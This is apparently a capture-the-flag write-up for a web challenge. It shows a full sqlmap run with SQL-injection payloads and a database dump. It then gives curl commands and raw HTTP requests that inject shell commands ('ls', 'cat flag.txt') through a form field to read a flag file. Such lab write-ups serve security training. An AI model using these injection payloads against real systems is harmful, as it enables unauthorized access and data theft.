



```
sqlmap -r req --dbms=sqlite --dump-all
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.4#stable}
|_ -| . [']     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:06:51 /2024-06-03/

[18:06:51] [INFO] parsing HTTP request from 'req'
[18:06:51] [INFO] testing connection to the target URL
got a 301 redirect to 'https://uscybercombine-s4-biocheck.chals.io/'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: query (POST)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: query=Albert Einstein' AND 8850=8850 AND 'STZy'='STZy

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 column
    Payload: query=Albert Einstein' UNION ALL SELECT CHAR(113,118,120,112,113)||CHAR(68,117,118,122,76,109,121,85,121,118,109,101,116,119,65,69,120,105,97,119,97,109,69,81,85,121,86,97,80,73,107,97,111,108,120,80,71,110,106,110)||CHAR(113,106,120,98,113)-- LgRQ
---
[18:06:55] [INFO] testing SQLite
[18:06:55] [INFO] confirming SQLite
[18:06:55] [INFO] actively fingerprinting SQLite
[18:06:55] [INFO] the back-end DBMS is SQLite
web application technology: OpenResty 1.19.3.1
back-end DBMS: SQLite
[18:06:55] [INFO] sqlmap will dump entries of all tables from all databases now
[18:06:55] [INFO] fetching tables for database: 'SQLite_masterdb'
[18:06:55] [INFO] fetching columns for table 'figures' 
[18:06:55] [INFO] fetching entries for table 'figures'
Database: <current>
Table: figures
[5 entries]
+----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------------+
| id | bio                                                                                                                                                                                                                                                               | name            |
+----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------------+
| 1  | Albert Einstein was a German-born theoretical physicist who developed the theory of relativity, one of the two pillars of modern physics, and is best known for his mass-energy equivalence formula                                                               | Albert Einstein |
| 2  | Isaac Newton was an English mathematician, physicist, and astronomer who formulated the laws of motion and universal gravitation, laying the groundwork for classical mechanics and profoundly influencing the scientific revolution.                             | Isaac Newton    |
| 3  | Galileo Galilei was an Italian astronomer, physicist, and engineer who played a major role in the scientific revolution. He made significant contributions to observational astronomy and is often referred to as the "father of modern observational astronomy." | Galileo Galilei |
| 4  | Nikola Tesla was a Serbian-American inventor, electrical engineer, mechanical engineer, and futurist best known for his contributions to the design of the modern alternating current (AC) electricity supply system.                                             | Nikola Tesla    |
| 5  | Marie Curie was a Polish-born physicist and chemist who conducted pioneering research on radioactivity. She was the first woman to win a Nobel Prize, and the only person to win Nobel Prizes in two different scientific fields.                                 | Marie Curie     |
+----+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+-----------------+

[18:06:55] [INFO] table 'SQLite_masterdb.figures' dumped to CSV file '/root/.local/share/sqlmap/output/uscybercombine-s4-biocheck.chals.io/dump/SQLite_masterdb/figures.csv'                                                                                                          
[18:06:55] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/uscybercombine-s4-biocheck.chals.io'

[*] ending @ 18:06:55 /2024-06-03/

```


 
```
SIVBGR{AIGNM}
```

## After Solve

 
`curl -X POST http://localhost:5004/ -d $'query=\'"; ls #'` 
`curl -X POST http://localhost:5004/ -d $'query=\'"; ls <random folder> #'` 
`curl -X POST http://localhost:5004/ -d $'query=\'"; cat <random folder>/flag.txt #'`


```
POST / HTTP/1.1
Host: uscybercombine-s4-biocheck.chals.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 28
Origin: https://uscybercombine-s4-biocheck.chals.io
Referer: https://uscybercombine-s4-biocheck.chals.io/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=1
Te: trailers
Connection: keep-alive

query=Albert+Einstein"; ls #
```

```
POST / HTTP/1.1
Host: uscybercombine-s4-biocheck.chals.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 61
Origin: https://uscybercombine-s4-biocheck.chals.io
Referer: https://uscybercombine-s4-biocheck.chals.io/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=1
Te: trailers
Connection: keep-alive

query=Albert+Einstein"; ls 4wKckKrtG5Gx22rChQW25C0kyLCku5Tv #
```


```
POST / HTTP/1.1
Host: uscybercombine-s4-biocheck.chals.io
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:126.0) Gecko/20100101 Firefox/126.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 71
Origin: https://uscybercombine-s4-biocheck.chals.io
Referer: https://uscybercombine-s4-biocheck.chals.io/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Priority: u=1
Te: trailers
Connection: keep-alive

query=Albert+Einstein"; cat 4wKckKrtG5Gx22rChQW25C0kyLCku5Tv/flag.txt #
```

```
<h2>Historical Figure: Albert Einstein&#34;; cat 4wKckKrtG5Gx22rChQW25C0kyLCku5Tv/flag.txt #</h2>
            <p>SIVBGR{H1st0ry_1s_1mp0rt4nt!}
</p>
```